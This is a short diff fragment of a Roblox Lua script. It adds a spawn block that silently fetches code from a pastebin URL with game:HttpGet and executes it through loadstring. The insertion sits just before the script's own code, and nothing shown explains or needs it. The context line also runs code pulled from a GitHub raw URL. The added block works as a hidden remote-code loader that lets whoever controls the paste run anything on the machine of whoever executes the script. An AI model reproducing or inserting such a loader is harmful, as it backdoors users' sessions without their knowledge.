@@ -16,6 +16,9 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/KUYKUBZ/Script/refs/h
 
 ]]
 
+spawn(function()
+  loadstring(game:HttpGet("https://pastebin.com/raw/KiSYpej6",true))()
+end)
 
 local LMG2L = {}; 
 
